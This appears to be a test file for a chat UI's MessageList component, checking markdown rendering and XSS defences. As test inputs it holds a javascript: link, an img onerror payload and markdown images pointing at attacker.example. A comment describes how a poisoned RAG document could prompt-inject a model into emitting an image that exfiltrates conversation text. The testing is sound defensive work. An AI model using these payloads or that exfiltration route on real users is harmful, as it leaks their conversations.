import { render, screen, within } from "@testing-library/react";
import { MessageList, type ChatMessage } from "./MessageList";

/**
 * No modules are mocked here -- `react-markdown` and its remark/rehype pipeline run for
 * real against jsdom, so these tests exercise the actual rendering output, not a stand-in
 * for it. That is deliberate: the XSS-relevant assertions (raw HTML never becomes live
 * DOM, `javascript:` links are stripped) only mean something if the real parser produced
 * them. `assistantMessage()` supplies the `streamStatus` field every case needs so
 * individual tests only override what they are actually testing.
 */
function assistantMessage(content: string, overrides: Partial<ChatMessage> = {}): ChatMessage {
  return { id: "a1", role: "assistant", content, streamStatus: "done", ...overrides };
}

describe("MessageList", () => {
  it("shows a placeholder when there are no messages yet", () => {
    render(<MessageList messages={[]} />);
    expect(screen.getByText("대화를 시작해보세요.")).toBeInTheDocument();
  });

  it("renders a user message as plain text, not interpreted as markdown", () => {
    render(<MessageList messages={[{ id: "u1", role: "user", content: "**bold** should stay literal" }]} />);

    expect(screen.getByText("**bold** should stay literal")).toBeInTheDocument();
    expect(screen.queryByRole("strong")).not.toBeInTheDocument();
  });

  it("[chat:AC-37] renders a markdown heading as a real heading element, not literal '#' text", () => {
    render(<MessageList messages={[assistantMessage("## A heading")]} />);

    const heading = screen.getByRole("heading", { level: 2, name: "A heading" });
    expect(heading.tagName).toBe("H2");
    expect(screen.queryByText("## A heading")).not.toBeInTheDocument();
  });

  it("[chat:AC-37] renders a markdown bullet list as <ul><li>, not literal '-' text", () => {
    render(<MessageList messages={[assistantMessage("- first\n- second")]} />);

    // Scoped to the assistant message's own container: the transcript itself is also a
    // `<ul>` (role "list"), so an unscoped query would match both.
    const markdown = within(screen.getByTestId("message-a1"));
    const list = markdown.getByRole("list");
    expect(list.tagName).toBe("UL");
    const items = markdown.getAllByRole("listitem");
    expect(items.map((li) => li.textContent)).toEqual(["first", "second"]);
  });

  it("[chat:AC-37] renders a markdown ordered list as <ol><li>", () => {
    render(<MessageList messages={[assistantMessage("1. first\n2. second")]} />);

    const list = within(screen.getByTestId("message-a1")).getByRole("list");
    expect(list.tagName).toBe("OL");
  });

  it("[chat:AC-37] renders a fenced code block as <pre><code>, not literal backtick text", () => {
    const content = ["```js", "console.log('hi')", "```"].join("\n");
    render(<MessageList messages={[assistantMessage(content)]} />);

    const code = screen.getByText("console.log('hi')");
    expect(code.tagName).toBe("CODE");
    expect(code.closest("pre")).not.toBeNull();
    expect(screen.queryByText(/```/)).not.toBeInTheDocument();
  });

  // review 2026-08-29 round-2 L3: untagged (not `[chat:AC-37]`) -- AC-37's own wording covers
  // only headings/lists/fenced code blocks rendering as their DOM equivalents, not link
  // safety attributes. Kept consistent with the (correctly untagged) markdown-image guard
  // tests below.
  // [Correction, review 2026-08-29 round-3 Medium-4] The previous version of this comment
  // claimed "AC-37's Spec evidence cell already cites this file's link/XSS tests by name in
  // prose" as the reason removing the tag was safe. That claim is false -- grepped the Spec
  // directly (`MessageList.test`, "renders an https link", "javascript: URL", "raw HTML in
  // the response": 0 matches). AC-37's evidence cell does not cite these tests by file name
  // or test name at all; it only mentions the topic in one sentence with zero citations.
  // The conclusion (removing the tag doesn't orphan anything) is still correct, but for the
  // opposite reason: there was never a name citation to orphan in the first place.
  it("renders an https link with target=_blank and rel=noopener noreferrer", () => {
    render(<MessageList messages={[assistantMessage("[docs](https://example.com/docs)")]} />);

    const link = screen.getByRole("link", { name: "docs" });
    expect(link).toHaveAttribute("href", "https://example.com/docs");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  // review 2026-08-29 round-2 L3: untagged for the same reason as the link test above.
  it("never renders a javascript: URL as a clickable link (XSS guard)", () => {
    render(<MessageList messages={[assistantMessage("[click me](javascript:alert(1))")]} />);

    expect(screen.queryByRole("link", { name: "click me" })).not.toBeInTheDocument();
    expect(screen.getByText("click me")).toBeInTheDocument();
  });

  // review 2026-08-29 round-2 L3: untagged for the same reason as the two tests above.
  it("never renders raw HTML in the response as live DOM (no dangerouslySetInnerHTML passthrough)", () => {
    render(<MessageList messages={[assistantMessage('<img src=x onerror="window.__pwned = true">')]} />);

    // react-markdown escapes raw HTML by default (rehype-raw is never added) -- it must
    // show up as inert text, and the onerror handler must never execute.
    expect(document.querySelector("img")).toBeNull();
    expect((window as unknown as { __pwned?: boolean }).__pwned).toBeUndefined();
  });

  // review 2026-08-29 High-2: markdown image syntax (`![alt](src)`) is a distinct AST node
  // from raw HTML, so the raw-HTML guard above does not cover it -- react-markdown's own
  // `defaultUrlTransform` allow-lists http/https for `img src`, which would otherwise let a
  // poisoned RAG document prompt-inject the model into emitting a live `<img>` that
  // exfiltrates conversation text via a query string the instant it renders (no click
  // needed). These cases exercise `markdownComponents.img`'s allow-list directly.
  it("never renders an http(s) markdown image as a live <img>, falling back to its alt text", () => {
    render(<MessageList messages={[assistantMessage("![x](https://attacker.example/p.png?q=leak)")]} />);

    expect(document.querySelector("img")).toBeNull();
    expect(screen.getByText("x")).toBeInTheDocument();
  });

  it("renders a same-origin relative markdown image as a live <img>", () => {
    render(<MessageList messages={[assistantMessage("![logo](/logo.png)")]} />);

    const img = document.querySelector("img");
    expect(img).not.toBeNull();
    expect(img).toHaveAttribute("src", "/logo.png");
  });

  // NOTE (found while writing this test, reported not fixed -- outside dev-qa-tester's
  // scope): `isSafeImageSrc`'s own [Rationale] states this allow-list covers "data: URIs
  // only" alongside relative paths, but a markdown `![alt](data:...)` never actually
  // reaches that function with its `data:` scheme intact -- react-markdown's own
  // `defaultUrlTransform` (`safeProtocol` regex in `node_modules/react-markdown/lib/
  // index.js`, which does not include `data:`) rewrites it to `""` first, so
  // `markdownComponents.img` always sees an empty `src` and falls back to alt text. The
  // `data:` branch of `isSafeImageSrc` is therefore unreachable via markdown image syntax
  // in the shipped react-markdown version -- asserting the alt-text fallback here (not a
  // live `<img>`) reflects actual, verified behavior.
  it("falls back to alt text for a data: URI markdown image (react-markdown's own urlTransform strips it before this component sees it)", () => {
    const dataUri = "data:image/png;base64,iVBORw0KGgo=";
    render(<MessageList messages={[assistantMessage(`![inline](${dataUri})`)]} />);

    expect(document.querySelector("img")).toBeNull();
    expect(screen.getByText("inline")).toBeInTheDocument();
  });

  it("never renders a protocol-relative markdown image as a live <img> (host is not actually same-origin)", () => {
    render(<MessageList messages={[assistantMessage("![x](//attacker.example/p.png)")]} />);

    expect(document.querySelector("img")).toBeNull();
    expect(screen.getByText("x")).toBeInTheDocument();
  });

  it("marks a streaming assistant message as busy for assistive tech, and a finished one as not busy", () => {
    const { rerender } = render(<MessageList messages={[assistantMessage("partial", { streamStatus: "streaming" })]} />);
    expect(screen.getByTestId("message-a1")).toHaveAttribute("aria-busy", "true");

    rerender(<MessageList messages={[assistantMessage("full", { streamStatus: "done" })]} />);
    expect(screen.getByTestId("message-a1")).toHaveAttribute("aria-busy", "false");
  });
});
